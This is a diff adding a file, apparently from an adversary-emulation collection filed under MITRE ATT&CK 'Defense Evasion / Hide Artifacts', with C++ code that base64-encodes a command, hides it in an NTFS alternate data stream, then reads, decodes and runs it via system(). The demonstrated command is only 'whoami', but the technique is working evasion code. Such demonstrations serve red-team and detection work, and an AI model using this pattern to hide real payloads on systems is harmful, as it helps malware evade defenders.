@@ -1,0 +1,71 @@
+---
+title: ".004.NTFS File Attributes"
+folder: "07. Defense Evasion/T1564 Hide Artifacts"
+---
+
+
+
+#include <windows.h>
+#include <fstream>
+#include <iostream>
+#include <string>
+#include <atlenc.h>
+#include <wincrypt.h>
+#include <vector>
+
+
+
+void AutorunRegistryBackground4() {
+
+    const char* command = "whoami";
+
+    char base64Command[4096];
+    DWORD base64Length = 0;
+    CryptBinaryToStringA(reinterpret_cast<const BYTE*>(command), strlen(command), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &base64Length);
+    CryptBinaryToStringA(reinterpret_cast<const BYTE*>(command), strlen(command), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, base64Command, &base64Length);
+
+    std::ofstream outputFile("test1.txt:ads", std::ios::out | std::ios::binary);
+    if (outputFile.is_open()) {
+        outputFile << base64Command;
+        outputFile.close();
+        std::cout << "Polecenie zapisane do pliku test1.txt:ads." << std::endl;
+    }
+    else {
+        std::cerr << "Nie można otworzyć pliku test1.txt:ads do zapisu." << std::endl;
+    }
+}
+void ExecuteCommand(const std::string& command, const std::string& outputFilePath) {
+
+    std::string commandWithRedirect = command + " > " + outputFilePath;
+    system(commandWithRedirect.c_str());
+}
+std::string DecryptBase64(const std::string& base64Text) {
+    DWORD decodedLength = 0;
+    CryptStringToBinaryA(base64Text.c_str(), base64Text.length(), CRYPT_STRING_BASE64, nullptr, &decodedLength, nullptr, nullptr);
+    std::vector<BYTE> buffer(decodedLength);
+    CryptStringToBinaryA(base64Text.c_str(), base64Text.length(), CRYPT_STRING_BASE64, buffer.data(), &decodedLength, nullptr, nullptr);
+    return std::string(buffer.begin(), buffer.end());
+}
+
+void ReadDecryptAndExecute() {
+
+    std::ifstream inputFile("test1.txt:ads", std::ios::binary);
+    if (!inputFile.is_open()) {
+        std::cerr << "Nie można otworzyć pliku test1.txt:ads." << std::endl;
+        return;
+    }
+
+    std::string base64Text((std::istreambuf_iterator<char>(inputFile)), std::istreambuf_iterator<char>());
+    inputFile.close();
+
+    std::string decryptedText = DecryptBase64(base64Text);
+
+    ExecuteCommand(decryptedText, "output.txt");
+}
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+
+    AutorunRegistryBackground4();
+    ReadDecryptAndExecute();
+    return 0;
+}
